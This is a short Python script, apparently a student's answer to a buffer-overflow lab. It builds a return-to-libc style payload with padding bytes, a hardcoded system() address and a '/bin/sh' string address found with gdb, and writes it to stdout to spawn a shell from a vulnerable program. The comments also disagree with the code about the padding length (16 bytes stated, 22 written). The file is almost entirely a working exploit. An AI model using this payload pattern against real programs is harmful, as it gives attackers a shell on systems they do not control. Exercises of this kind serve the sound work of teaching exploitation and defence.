#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# buf address is ebp-12 in vulnerable
# 16 bytes of padding to overwrite the return address from vulnerable

# address of bin using gbd find command
binaddr = pack('<I',0xfffec464)

# system() call address in greetings()
system_addr = pack('<I', 0x080488b3)

# bin bytes
byt = b'/bin/sh'

# garbage bits assigned

sys.stdout.buffer.write(22*b'\x66' + system_addr + binaddr +byt)
